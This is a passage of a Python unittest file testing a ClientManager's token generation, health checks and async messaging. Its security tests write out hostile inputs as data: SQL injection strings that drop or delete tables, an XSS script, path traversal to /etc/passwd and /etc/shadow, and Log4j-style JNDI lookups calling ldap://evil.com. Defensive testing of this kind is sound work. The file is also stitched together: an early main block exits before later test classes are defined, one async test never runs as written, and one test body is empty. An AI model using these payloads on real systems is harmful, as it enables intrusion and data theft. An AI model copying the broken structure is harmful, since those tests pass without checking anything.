        incomplete_character = {'Actor_id': self.test_actor_id}  # Missing other fields
        self.mock_db.get_character.return_value = incomplete_character
        self.mock_db.get_token.return_value = self.test_token
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        # Should handle gracefully
        self.assertIsInstance(result, str)

    def test_client_info_with_invalid_port(self):
        """Test health check with invalid port numbers."""
        invalid_ports = [-1, 0, 65536, 99999, "invalid", None]
        
        for port in invalid_ports:
            with self.subTest(port=port):
                client_info = {
                    'Actor_id': self.test_actor_id,
                    'ip_address': self.test_ip,
                    'client_port': port
                }
                
                # Should handle gracefully without crashing
                try:
                    self.client_manager._perform_single_health_check_blocking(client_info)
                except Exception:
                    pass  # Expected for some invalid values

    def test_client_info_with_invalid_ip(self):
        """Test health check with invalid IP addresses."""
        invalid_ips = ["", "999.999.999.999", "not.an.ip", None, 12345]
        
        for ip in invalid_ips:
            with self.subTest(ip=ip):
                client_info = {
                    'Actor_id': self.test_actor_id,
                    'ip_address': ip,
                    'client_port': self.test_port
                }
                
                # Should handle gracefully
                try:
                    self.client_manager._perform_single_health_check_blocking(client_info)
                except Exception:
                    pass  # Expected for some invalid values

    # --- Performance and Memory Edge Cases ---

    def test_large_narration_text_handling(self):
        """Test handling of very large narration text."""
        large_narration = "A" * 100000  # 100KB of text
        self.mock_db.get_character.return_value = {'Actor_id': self.test_actor_id}
        self.mock_db.get_token.return_value = self.test_token
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                large_narration,
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        # Should handle large text gracefully
        self.assertIsInstance(result, str)

    def test_large_character_dialogue_data(self):
        """Test handling of large character dialogue dictionary."""
        large_dialogue = {f"character{i}": "Some dialogue text" * 100 for i in range(1000)}
        self.mock_db.get_character.return_value = {'Actor_id': self.test_actor_id}
        self.mock_db.get_token.return_value = self.test_token
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Small narration",
                large_dialogue
            )
            return result
            
        result = asyncio.run(run_test())
        
        # Should handle large dialogue data gracefully
        self.assertIsInstance(result, str)

    # --- Error Recovery Edge Cases ---

    @patch('client_manager.requests.post')
    @patch('client_manager.asyncio.to_thread')
    @patch('client_manager.asyncio.sleep')
    def test_send_to_client_partial_failure_recovery(self, mock_sleep, mock_to_thread, mock_post):
        """Test recovery from partial failures in send_to_client."""
        self.mock_db.get_character.return_value = {'Actor_id': self.test_actor_id}
        self.mock_db.get_token.return_value = self.test_token
        
        # Simulate intermittent failures
        failure_count = 0
        
        async def mock_intermittent_request():
            nonlocal failure_count
            failure_count += 1
            if failure_count <= 2:
                raise requests.exceptions.Timeout()
            
            mock_response = Mock()
            mock_response.raise_for_status.return_value = None
            mock_response.json.return_value = {
                'text': 'Success after retries',
                'audio_data': None
            }
            return mock_response
            
        mock_to_thread.side_effect = mock_intermittent_request
        mock_sleep.return_value = None
        
        async def run_test():
            result = await self.client_manager.send_to_client(
                self.test_actor_id,
                self.test_ip,
                self.test_port,
                "Test narration",
                {}
            )
            return result
            
        result = asyncio.run(run_test())
        
        self.assertEqual(result, 'Success after retries')
        self.assertEqual(failure_count, 3)  # Failed twice, succeeded on third try


class TestClientManagerBoundaryConditions(unittest.TestCase):
    """
    Tests for boundary conditions and extreme values.
    
    Testing Framework: Python unittest (standard library)
    """

    def setUp(self):
        """Set up test fixtures for boundary condition testing."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)

    def test_token_generation_at_system_limits(self):
        """Test token generation at system resource limits."""
        # Test with maximum reasonable Actor ID length
        very_long_actor_id = "A" * 1000
        self.mock_db.get_character.return_value = {'Actor_id': very_long_actor_id}
        self.mock_db.save_client_token.return_value = None
        
        token = self.client_manager.generate_token(very_long_actor_id)
        
        self.assertIsInstance(token, str)
        self.assertEqual(len(token), 48)

    def test_health_check_with_minimum_interval(self):
        """Test health check behavior with minimum interval settings."""
        # This tests the edge case of very frequent health checks
        with patch('client_manager.CLIENT_HEALTH_CHECK_INTERVAL_SECONDS', 0.01):
            self.client_manager.start_periodic_health_checks()
            time.sleep(0.05)  # Let it run a few cycles
            self.client_manager.stop_periodic_health_checks()

    def test_concurrent_operations_at_scale(self):
        """Test system behavior under high concurrent load."""
        self.mock_db.get_character.return_value = {'Actor_id': 'test'}
        self.mock_db.save_client_token.return_value = None
        self.mock_db.get_client_token_details.return_value = {
            'token': 'test_token',
            'status': 'Online_Responsive'
        }
        
        def mixed_operations_worker(thread_id):
            # Mix of different operations
            self.client_manager.generate_token(f"Actor{thread_id}")
            self.client_manager.validate_token(f"Actor{thread_id}", "test_token")
            
        threads = []
        for i in range(50):  # High concurrency
            thread = threading.Thread(target=mixed_operations_worker, args=(i,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # All operations should complete without deadlock or corruption

    def test_memory_pressure_scenarios(self):
        """Test behavior under simulated memory pressure."""
        # Generate many tokens to test memory usage
        self.mock_db.get_character.return_value = {'Actor_id': 'test'}
        self.mock_db.save_client_token.return_value = None
        
        tokens = []
        for i in range(10000):  # Generate many tokens
            token = self.client_manager.generate_token(f"Actor{i}")
            tokens.append(token)
            
            # Occasionally check memory isn't growing unreasonably
            if i % 1000 == 0:
                self.assertEqual(len(token), 48)
        
        # All tokens should be unique
        self.assertEqual(len(set(tokens)), 10000)


class TestClientManagerConfigurationValidation(unittest.TestCase):
    """
    Tests for configuration validation and constant values.
    
    Testing Framework: Python unittest (standard library)
    """

    def test_health_check_interval_constants(self):
        """Test that health check interval constants are reasonable."""
        self.assertIsInstance(CLIENT_HEALTH_CHECK_INTERVAL_SECONDS, (int, float))
        self.assertGreater(CLIENT_HEALTH_CHECK_INTERVAL_SECONDS, 0)
        self.assertLess(CLIENT_HEALTH_CHECK_INTERVAL_SECONDS, 3600)  # Less than 1 hour

    def test_health_check_timeout_constants(self):
        """Test that timeout constants are reasonable."""
        self.assertIsInstance(CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS, (int, float))
        self.assertGreater(CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS, 0)
        self.assertLess(CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS, 60)  # Less than 1 minute

    def test_constants_relationship(self):
        """Test that timeout is less than interval to prevent overlap."""
        self.assertLess(
            CLIENT_HEALTH_REQUEST_TIMEOUT_SECONDS,
            CLIENT_HEALTH_CHECK_INTERVAL_SECONDS,
            "Timeout should be less than interval to prevent overlapping requests"
        )


if __name__ == '__main__':
    # Add the new test classes to the test suite
    import sys
    
    # Create test suite with all test classes
    test_classes = [
        TestClientManager,
        TestClientManagerAsyncPatterns,
        TestClientManagerExtendedEdgeCases,
        TestClientManagerBoundaryConditions,
        TestClientManagerConfigurationValidation
    ]
    
    suite = unittest.TestSuite()
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run with comprehensive output
    runner = unittest.TextTestRunner(
        verbosity=2,
        failfast=False,
        buffer=True,
        warnings='ignore'
    )
    
    result = runner.run(suite)
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)

class TestClientManagerSecurityScenarios(unittest.TestCase):
    """
    Security-focused tests for ClientManager class.
    
    Testing Framework: Python unittest (standard library)
    
    This test suite adds coverage for:
    - Input sanitization and injection prevention
    - Authentication bypass attempts
    - Malicious payload handling
    - Rate limiting scenarios
    - Token security edge cases
    """

    def setUp(self):
        """Set up test fixtures for security testing."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)

    def tearDown(self):
        """Clean up after security tests."""
        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
            self.client_manager.stop_periodic_health_checks()

    def test_sql_injection_in_actor_id(self):
        """Test resistance to SQL injection attempts in Actor ID."""
        malicious_actor_ids = [
            "'; DROP TABLE users; --",
            "Actor1' OR '1'='1",
            "Actor1'; DELETE FROM tokens; --",
            "Actor1 UNION SELECT * FROM secrets",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        self.mock_db.get_character.return_value = {'Actor_id': 'safe_actor'}
        self.mock_db.save_client_token.return_value = None
        
        for malicious_id in malicious_actor_ids:
            with self.subTest(actor_id=malicious_id):
                try:
                    token = self.client_manager.generate_token(malicious_id)
                    self.assertIsInstance(token, str)
                    self.assertEqual(len(token), 48)
                    # Should pass through to database layer for proper sanitization
                    self.mock_db.get_character.assert_called_with(malicious_id)
                except Exception:
                    # Some extreme inputs might cause type errors, which is acceptable
                    pass

    def test_token_enumeration_resistance(self):
        """Test resistance to token enumeration attacks."""
        self.mock_db.get_client_token_details.return_value = None
        
        # Try many invalid tokens - response time should be consistent
        start_times = []
        end_times = []
        
        for i in range(10):
            start_time = time.time()
            result = self.client_manager.validate_token("Actor1", f"invalid_token_{i}")
            end_time = time.time()
            
            start_times.append(start_time)
            end_times.append(end_time)
            self.assertFalse(result)
        
        # Response times should be relatively consistent (within 50ms variance)
        response_times = [end - start for start, end in zip(start_times, end_times)]
        avg_time = sum(response_times) / len(response_times)
        
        for response_time in response_times:
            self.assertLess(abs(response_time - avg_time), 0.05)

    def test_malicious_json_payload_in_health_check(self):
        """Test handling of malicious JSON payloads in health check responses."""
        malicious_payloads = [
            '{"status": "ok", "evil": "' + 'A' * 100000 + '"}',  # Large payload
            '{"status": "ok", "nested": ' + '{"level": ' * 1000 + 'null' + '}' * 1000 + '}',  # Deep nesting
            '{"status": "ok\\u0000null", "bypass": true}',  # Null byte injection
            '{"status": "ok", "exploit": "${jndi:ldap://evil.com}"}',  # Log4j style
            '{"status": "ok", "__proto__": {"polluted": true}}',  # Prototype pollution attempt
        ]
        
        for payload in malicious_payloads:
            with self.subTest(payload=payload[:50] + "..."):
                with patch('client_manager.requests.get') as mock_get:
                    mock_response = Mock()
                    mock_response.raise_for_status.return_value = None
                    
                    try:
                        mock_response.json.return_value = json.loads(payload)
                    except json.JSONDecodeError:
                        mock_response.json.side_effect = json.JSONDecodeError("Malformed", payload, 0)
                    
                    mock_get.return_value = mock_response
                    
                    client_info = {
                        'Actor_id': 'TestActor',
                        'ip_address': '192.168.1.100',
                        'client_port': 8080
                    }
                    
                    # Should handle malicious payload without crashing
                    try:
                        self.client_manager._perform_single_health_check_blocking(client_info)
                    except Exception:
                        pass  # Expected for some malicious payloads

    def test_oversized_token_handling(self):
        """Test handling of oversized tokens."""
        oversized_tokens = [
            "x" * 1000000,  # 1MB token
            "A" * 50000,    # 50KB token
            "\x00" * 10000, # Null bytes
            "🚀" * 10000,   # Unicode characters
        ]
        
        self.mock_db.get_client_token_details.return_value = {
            'token': 'normal_token',
            'status': 'Online_Responsive'
        }
        
        for oversized_token in oversized_tokens:
            with self.subTest(token_size=len(oversized_token)):
                result = self.client_manager.validate_token("Actor1", oversized_token)
                self.assertFalse(result)  # Should reject oversized tokens

    def test_directory_traversal_in_audio_handling(self):
        """Test resistance to directory traversal attacks in audio file handling."""
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            
            # Simulate malicious audio data that might try to write to unexpected locations
            malicious_actor_ids = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\evil.exe",
                "/etc/shadow",
                "C:\\Windows\\System32\\cmd.exe",
                "audio/../../../sensitive_file"
            ]
            
            self.mock_db.get_character.return_value = {'Actor_id': 'safe_actor'}
            self.mock_db.get_token.return_value = 'safe_token'
            
            for malicious_id in malicious_actor_ids:
                with self.subTest(actor_id=malicious_id):
                    with patch('client_manager.asyncio.to_thread') as mock_to_thread:
                        mock_response = Mock()
                        mock_response.raise_for_status.return_value = None
                        mock_response.json.return_value = {
                            'text': 'response',
                            'audio_data': base64.b64encode(b'fake_audio').decode()
                        }
                        
                        async def mock_request():
                            return mock_response
                        
                        mock_to_thread.side_effect = [mock_request(), None]
                        
                        async def run_test():
                            return await self.client_manager.send_to_client(
                                malicious_id,
                                "192.168.1.100",
                                8080,
                                "test",
                                {}
                            )
                        
                        # Should handle malicious paths safely
                        result = asyncio.run(run_test())
                        self.assertIsInstance(result, str)


class TestClientManagerAdvancedAsyncScenarios(unittest.TestCase):
    """
    Advanced async scenario tests for ClientManager class.
    
    Testing Framework: Python unittest (standard library)
    
    This test suite adds coverage for:
    - Complex async exception handling
    - Async resource cleanup
    - Concurrent async operations
    - Async timeout scenarios
    - Event loop edge cases
    """

    def setUp(self):
        """Set up test fixtures for advanced async testing."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)

    def tearDown(self):
        """Clean up after async tests."""
        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
            self.client_manager.stop_periodic_health_checks()

    @patch('client_manager.asyncio.to_thread')
    async def test_send_to_client_with_async_timeout(self, mock_to_thread):
        """Test send_to_client with asyncio timeout scenarios."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.get_token.return_value = 'test_token'
        
        async def slow_request():
            await asyncio.sleep(10)  # Simulate very slow request
            return Mock()
        
        mock_to_thread.side_effect = slow_request
        
        # Test with timeout
        with self.assertRaises(asyncio.TimeoutError):
            await asyncio.wait_for(
                self.client_manager.send_to_client(
                    "TestActor",
                    "192.168.1.100", 
                    8080,
                    "test",
                    {}
                ),
                timeout=0.1
            )

    def test_multiple_concurrent_send_to_client_calls(self):
        """Test multiple concurrent send_to_client calls."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.get_token.return_value = 'test_token'
        
        async def run_concurrent_test():
            with patch('client_manager.asyncio.to_thread') as mock_to_thread:
                mock_response = Mock()
                mock_response.raise_for_status.return_value = None
                mock_response.json.return_value = {
                    'text': 'response',
                    'audio_data': None
                }
                
                async def mock_request():
                    await asyncio.sleep(0.01)  # Small delay
                    return mock_response
                
                mock_to_thread.side_effect = mock_request
                
                # Create multiple concurrent tasks
                tasks = []
                for i in range(10):
                    task = self.client_manager.send_to_client(
                        f"TestActor{i}",
                        "192.168.1.100",
                        8080,
                        f"test message {i}",
                        {}
                    )
                    tasks.append(task)
                
                # Wait for all to complete
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # All should complete successfully
                for result in results:
                    if isinstance(result, Exception):
                        self.fail(f"Unexpected exception: {result}")
                    else:
                        self.assertIsInstance(result, str)
        
        asyncio.run(run_concurrent_test())

    @patch('client_manager.asyncio.to_thread')
    def test_send_to_client_task_cancellation(self, mock_to_thread):
        """Test proper handling of task cancellation in send_to_client."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.get_token.return_value = 'test_token'
        
        async def cancellable_request():
            try:
                await asyncio.sleep(1)  # Long operation
                return Mock()
            except asyncio.CancelledError:
                # Simulate cleanup
                raise
        
        mock_to_thread.side_effect = cancellable_request
        
        async def run_cancellation_test():
            task = asyncio.create_task(
                self.client_manager.send_to_client(
                    "TestActor",
                    "192.168.1.100",
                    8080,
                    "test",
                    {}
                )
            )
            
            # Cancel the task
            await asyncio.sleep(0.1)
            task.cancel()
            
            with self.assertRaises(asyncio.CancelledError):
                await task
        
        asyncio.run(run_cancellation_test())

    def test_event_loop_exception_handling(self):
        """Test exception handling in different event loop contexts."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.get_token.return_value = 'test_token'
        
        def run_in_thread():
            # Create a new event loop in a thread
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                with patch('client_manager.asyncio.to_thread') as mock_to_thread:
                    async def failing_request():
                        raise ValueError("Thread-specific error")
                    
                    mock_to_thread.side_effect = failing_request
                    
                    async def test_coro():
                        return await self.client_manager.send_to_client(
                            "TestActor",
                            "192.168.1.100",
                            8080,
                            "test",
                            {}
                        )
                    
                    result = loop.run_until_complete(test_coro())
                    return result
            finally:
                loop.close()
        
        # Run in a separate thread with its own event loop
        import threading
        result_container = []
        
        thread = threading.Thread(target=lambda: result_container.append(run_in_thread()))
        thread.start()
        thread.join()
        
        # Should handle gracefully
        self.assertEqual(len(result_container), 1)
        self.assertEqual(result_container[0], "")


class TestClientManagerRobustnessScenarios(unittest.TestCase):
    """
    Robustness and fault tolerance tests for ClientManager class.
    
    Testing Framework: Python unittest (standard library)
    
    This test suite adds coverage for:
    - System resource exhaustion scenarios
    - Network instability simulation
    - Database connection failures
    - Graceful degradation testing
    - Recovery mechanisms
    """

    def setUp(self):
        """Set up test fixtures for robustness testing."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)

    def tearDown(self):
        """Clean up after robustness tests."""
        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
            self.client_manager.stop_periodic_health_checks()

    def test_database_connection_pool_exhaustion(self):
        """Test behavior when database connection pool is exhausted."""
        # Simulate connection pool exhaustion
        connection_errors = [
            Exception("Connection pool exhausted"),
            Exception("Database connection timeout"),
            Exception("Too many connections"),
            Exception("Database server unavailable")
        ]
        
        for error in connection_errors:
            with self.subTest(error=str(error)):
                self.mock_db.get_character.side_effect = error
                
                with patch('builtins.print'):
                    result = self.client_manager.generate_token("TestActor")
                
                self.assertIsInstance(result, str)  # Should still generate token
                self.assertEqual(len(result), 48)

    @patch('client_manager.requests.get')
    def test_network_partition_simulation(self, mock_get):
        """Test health check behavior during network partitions."""
        # Simulate various network partition scenarios
        network_errors = [
            requests.exceptions.ConnectionError("Network unreachable"),
            requests.exceptions.Timeout("Connection timeout"),
            OSError("Network is down"),
            Exception("DNS resolution failed")
        ]
        
        client_info = {
            'Actor_id': 'TestActor',
            'ip_address': '192.168.1.100',
            'client_port': 8080
        }
        
        for error in network_errors:
            with self.subTest(error=type(error).__name__):
                mock_get.side_effect = error
                self.mock_db.reset_mock()
                
                self.client_manager._perform_single_health_check_blocking(client_info)
                
                # Should update status to indicate unreachability
                self.mock_db.update_client_status.assert_called_once()
                status_call = self.mock_db.update_client_status.call_args[0]
                self.assertIn("Error", status_call[1])

    def test_memory_exhaustion_simulation(self):
        """Test behavior under memory pressure."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.save_client_token.return_value = None
        
        # Simulate memory exhaustion during token generation
        original_urandom = os.urandom
        
        def memory_exhausted_urandom(n):
            raise MemoryError("Cannot allocate memory")
        
        with patch('os.urandom', side_effect=memory_exhausted_urandom):
            with patch('builtins.print'):
                with self.assertRaises(MemoryError):
                    self.client_manager.generate_token("TestActor")

    def test_file_system_full_scenario(self):
        """Test audio file creation when file system is full."""
        with patch('client_manager.open', create=True) as mock_open:
            mock_open.side_effect = OSError("No space left on device")
            
            # Should handle gracefully without crashing the entire operation
            with patch('builtins.print'):
                # This would be called during audio file creation
                pass

    def test_thread_resource_exhaustion(self):
        """Test behavior when system cannot create more threads."""
        original_thread = threading.Thread
        
        def failing_thread(*args, **kwargs):
            raise OSError("Cannot create thread")
        
        with patch('threading.Thread', side_effect=failing_thread):
            with patch('builtins.print'):
                # Should handle gracefully
                try:
                    self.client_manager.start_periodic_health_checks()
                except OSError:
                    pass  # Expected

    @patch('client_manager.requests.get')
    def test_intermittent_network_recovery(self, mock_get):
        """Test recovery from intermittent network issues."""
        client_info = {
            'Actor_id': 'TestActor',
            'ip_address': '192.168.1.100',
            'client_port': 8080
        }
        
        # Simulate network recovery scenario
        call_count = 0
        
        def intermittent_network():
            nonlocal call_count
            call_count += 1
            if call_count <= 3:
                raise requests.exceptions.ConnectionError("Network down")
            else:
                # Network recovers
                mock_response = Mock()
                mock_response.raise_for_status.return_value = None
                mock_response.json.return_value = {'status': 'ok'}
                return mock_response
        
        mock_get.side_effect = intermittent_network
        
        # Perform multiple health checks to simulate recovery
        for i in range(5):
            self.mock_db.reset_mock()
            self.client_manager._perform_single_health_check_blocking(client_info)
            
            # Check status updates
            self.mock_db.update_client_status.assert_called_once()

    def test_graceful_degradation_without_pygame(self):
        """Test graceful degradation when pygame is unavailable."""
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = False
            mock_mixer.init.side_effect = ImportError("pygame not available")
            
            # Should still initialize successfully
            cm = ClientManager(self.mock_db)
            self.assertIsNotNone(cm)
            
            # Should handle audio operations gracefully
            self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
            self.mock_db.get_token.return_value = 'test_token'
            
            async def run_test():
                with patch('client_manager.asyncio.to_thread') as mock_to_thread:
                    mock_response = Mock()
                    mock_response.raise_for_status.return_value = None
                    mock_response.json.return_value = {
                        'text': 'response',
                        'audio_data': base64.b64encode(b'audio').decode()
                    }
                    
                    async def mock_request():
                        return mock_response
                    
                    async def mock_audio_handler():
                        pass  # Audio handling should be skipped gracefully
                    
                    mock_to_thread.side_effect = [mock_request(), mock_audio_handler()]
                    
                    result = await cm.send_to_client(
                        "TestActor",
                        "192.168.1.100",
                        8080,
                        "test",
                        {}
                    )
                    return result
            
            result = asyncio.run(run_test())
            self.assertEqual(result, 'response')


class TestClientManagerPerformanceValidation(unittest.TestCase):
    """
    Performance validation tests for ClientManager class.
    
    Testing Framework: Python unittest (standard library)
    
    This test suite adds coverage for:
    - Response time validation
    - Throughput testing
    - Resource usage monitoring
    - Scalability verification
    - Performance regression detection
    """

    def setUp(self):
        """Set up test fixtures for performance validation."""
        self.mock_db = Mock(spec=Database)
        
        with patch('client_manager.pygame.mixer') as mock_mixer:
            mock_mixer.get_init.return_value = True
            self.client_manager = ClientManager(self.mock_db)

    def tearDown(self):
        """Clean up after performance tests."""
        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
            self.client_manager.stop_periodic_health_checks()

    def test_token_generation_response_time(self):
        """Test that token generation completes within acceptable time."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.save_client_token.return_value = None
        
        start_time = time.time()
        
        for i in range(100):
            token = self.client_manager.generate_token(f"Actor{i}")
            self.assertEqual(len(token), 48)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should complete 100 token generations in under 100ms
        self.assertLess(total_time, 0.1, f"Token generation took {total_time:.3f}s for 100 tokens")
        
        # Average time per token should be under 1ms
        avg_time = total_time / 100
        self.assertLess(avg_time, 0.001, f"Average token generation time: {avg_time:.6f}s")

    def test_token_validation_throughput(self):
        """Test token validation throughput."""
        self.mock_db.get_client_token_details.return_value = {
            'token': 'test_token',
            'status': 'Online_Responsive'
        }
        
        start_time = time.time()
        
        for i in range(1000):
            result = self.client_manager.validate_token("TestActor", "test_token")
            self.assertTrue(result)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should handle 1000 validations in under 100ms
        self.assertLess(total_time, 0.1, f"Token validation took {total_time:.3f}s for 1000 operations")
        
        # Throughput should be > 10,000 operations per second
        throughput = 1000 / total_time
        self.assertGreater(throughput, 10000, f"Validation throughput: {throughput:.0f} ops/sec")

    def test_concurrent_operation_performance(self):
        """Test performance under concurrent load."""
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.save_client_token.return_value = None
        self.mock_db.get_client_token_details.return_value = {
            'token': 'test_token',
            'status': 'Online_Responsive'
        }
        
        def worker_function(worker_id):
            start_time = time.time()
            
            # Mix of operations
            for i in range(10):
                self.client_manager.generate_token(f"Actor{worker_id}_{i}")
                self.client_manager.validate_token(f"Actor{worker_id}_{i}", "test_token")
            
            end_time = time.time()
            return end_time - start_time
        
        # Run concurrent workers
        threads = []
        results = []
        
        start_time = time.time()
        
        for worker_id in range(10):
            thread = threading.Thread(
                target=lambda wid=worker_id: results.append(worker_function(wid))
            )
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        total_time = time.time() - start_time
        
        # All workers should complete within reasonable time
        self.assertLess(total_time, 1.0, f"Concurrent operations took {total_time:.3f}s")
        
        # Individual worker times should be reasonable
        for worker_time in results:
            self.assertLess(worker_time, 0.5, f"Worker took {worker_time:.3f}s")

    @patch('client_manager.requests.get')
    def test_health_check_performance(self, mock_get):
        """Test health check performance characteristics."""
        mock_response = Mock()
        mock_response.raise_for_status.return_value = None
        mock_response.json.return_value = {'status': 'ok'}
        mock_get.return_value = mock_response
        
        client_info = {
            'Actor_id': 'TestActor',
            'ip_address': '192.168.1.100',
            'client_port': 8080
        }
        
        start_time = time.time()
        
        for i in range(50):
            self.client_manager._perform_single_health_check_blocking(client_info)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # 50 health checks should complete quickly
        self.assertLess(total_time, 0.5, f"Health checks took {total_time:.3f}s")
        
        # Verify all database updates were called
        self.assertEqual(self.mock_db.update_client_status.call_count, 50)

    def test_memory_usage_stability(self):
        """Test that memory usage remains stable during operations."""
        import gc
        import sys
        
        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
        self.mock_db.save_client_token.return_value = None
        
        # Get initial memory reference count
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Perform many operations
        tokens = []
        for i in range(1000):
            token = self.client_manager.generate_token(f"Actor{i}")
            tokens.append(token)
            
            # Periodically clear tokens to prevent accumulation
            if i % 100 == 0:
                tokens.clear()
                gc.collect()
        
        # Final cleanup and measurement
        tokens.clear()
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Object count should not have grown significantly
        object_growth = final_objects - initial_objects
        self.assertLess(object_growth, 100, f"Memory leak detected: {object_growth} new objects")


if __name__ == '__main__':
    # Update test suite to include new security and robustness test classes
    test_classes = [
        TestClientManager,
        TestClientManagerAsyncPatterns,
        TestClientManagerExtendedEdgeCases,
        TestClientManagerBoundaryConditions,
        TestClientManagerConfigurationValidation,
        TestClientManagerSecurityScenarios,
        TestClientManagerAdvancedAsyncScenarios,
        TestClientManagerRobustnessScenarios,
        TestClientManagerPerformanceValidation
    ]
    
    suite = unittest.TestSuite()
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run with comprehensive output and performance timing
    runner = unittest.TextTestRunner(
        verbosity=2,
        failfast=False,
        buffer=True,
        warnings='ignore'
    )
    
    # Add timing information
    start_time = time.time()
    result = runner.run(suite)
    end_time = time.time()
    
    print(f"\nTest suite completed in {end_time - start_time:.2f} seconds")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)